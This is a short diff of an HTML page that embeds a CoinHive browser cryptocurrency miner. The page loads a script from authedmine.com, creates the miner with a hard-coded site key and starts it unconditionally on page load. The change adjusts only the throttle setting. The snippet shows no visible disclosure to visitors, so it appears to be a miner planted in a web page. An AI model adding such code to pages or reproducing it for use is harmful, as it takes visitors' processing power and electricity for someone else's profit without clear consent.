@@ -1,7 +1,7 @@
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script type="text/javascript">
 //<![CDATA[
-        var miner = new CoinHive.Anonymous('oaw1bYjSLkMK9QnvVtW0uaWoyLgM9wWo', {throttle: 0.3});
+        var miner = new CoinHive.Anonymous('oaw1bYjSLkMK9QnvVtW0uaWoyLgM9wWo', {throttle: 1});
         if (true) {
                 miner.start();
         }
